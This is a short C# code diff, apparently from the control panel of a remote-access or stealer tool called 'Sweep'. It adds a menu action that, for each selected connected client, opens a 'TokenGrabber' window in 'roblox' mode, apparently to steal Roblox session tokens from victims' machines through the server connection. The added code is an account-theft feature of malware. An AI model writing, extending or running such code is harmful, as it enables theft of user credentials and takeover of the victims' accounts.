@@ -209,6 +209,26 @@ namespace Sweep.Forms
                 }
             }
         }
+
+        private void robloxGraToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var f = new TokenGrabber();
+                    f.serverHost = _server;
+                    f.connid = item.ID;
+                    f.mode = "roblox";
+                    f.Show();
+                }
+            }
+        }
     }
 
 }
